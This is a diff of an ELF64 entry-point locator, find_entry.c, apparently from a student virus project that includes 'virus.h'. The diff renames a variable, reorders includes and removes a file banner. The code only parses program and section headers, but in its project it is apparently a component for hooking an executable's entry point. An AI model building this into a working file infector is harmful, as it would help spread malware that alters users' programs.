@@ -1,19 +1,7 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   find_entry.c                                       :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/05/10 23:43:29 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 23:59:37 by anselme          ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
 
-#include "accessors.h"
-#include "errors.h"
-#include "utils.h"
 #include "virus.h"
+#include "utils.h"
+#include "errors.h"
 
 struct	data
 {
@@ -68,7 +56,7 @@ static bool	find_entry_phdr(struct safe_ptr ref, const size_t offset, void *data
 	return true;
 }
 
-bool		find_entry(struct entry *file_entry, struct safe_ptr ref)
+bool		find_entry(struct entry *entry, struct safe_ptr ref)
 {
 	struct data	closure;
 	Elf64_Ehdr	*safe_elf64_hdr;
@@ -77,24 +65,24 @@ bool		find_entry(struct entry *file_entry, struct safe_ptr ref)
 	if (!safe_elf64_hdr) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
 	closure.e_entry = (safe_elf64_hdr->e_entry);
 
-	bzero(file_entry, sizeof(*file_entry));
-	closure.stored_entry = file_entry;
+	bzero(entry, sizeof(*entry));
+	closure.stored_entry = entry;
 
 	if (!foreach_phdr(ref, find_entry_phdr, &closure))
 		return errors(ERR_THROW, _ERR_FIND_ENTRY);
-	if (!file_entry->safe_phdr)
+	if (!entry->safe_phdr)
 		return errors(ERR_FILE, _ERR_NO_ENTRY_PHDR);
 
 	if (!foreach_shdr(ref, find_entry_shdr, &closure))
 		return errors(ERR_THROW, _ERR_FIND_ENTRY);
-	if (!file_entry->safe_shdr)
+	if (!entry->safe_shdr)
 		return errors(ERR_FILE, _ERR_NO_ENTRY_SHDR);
 
-	const Elf64_Addr sh_addr  = (file_entry->safe_shdr->sh_addr);
+	const Elf64_Addr sh_addr  = (entry->safe_shdr->sh_addr);
 
-	file_entry->offset_in_section = closure.e_entry - sh_addr;
+	entry->offset_in_section = closure.e_entry - sh_addr;
 
-	if (file_entry->end_of_last_section == 0)
+	if (entry->end_of_last_section == 0)
 		return errors(ERR_FILE, _ERR_NO_SECT_IN_ENTRY_SEG);
 
 	return true;
